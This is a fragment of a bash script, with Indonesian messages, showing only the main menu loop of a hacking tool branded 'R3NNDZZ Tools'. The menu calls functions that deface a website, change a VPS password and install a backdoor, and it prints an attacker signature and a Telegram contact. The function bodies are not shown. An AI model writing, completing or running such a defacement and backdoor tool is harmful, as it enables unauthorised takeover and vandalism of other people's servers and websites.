# ==============================================
# MAIN LOOP
# ==============================================
while true; do
    show_menu
    read choice
    
    case $choice in
        1)
            deface_website
            ;;
        2)
            change_vps_password
            ;;
        3)
            install_backdoor
            ;;
        4)
            if [ -d "$BACKUP_DIR" ]; then
                restore_original
            else
                echo -e "\n${RED}âŒ Tidak ada backup ditemukan! Jalankan deface dulu.${NC}"
            fi
            ;;
        5)
            show_status
            ;;
        6)
            cleanup
            ;;
        0)
            echo -e "\n${GREEN}Thanks for using R3NNDZZ Tools!${NC}"
            echo -e "${CYAN}Telegram: @lynnn046${NC}"
            echo -e "${RED}R3NNDZZ WAS HERE!${NC}\n"
            cleanup
            exit 0
            ;;
        *)
            echo -e "\n${RED}Pilihan tidak valid!${NC}"
            ;;
    esac
    
    echo ""
    echo -ne "${CYAN}Tekan Enter untuk kembali ke menu...${NC}"
    read
done
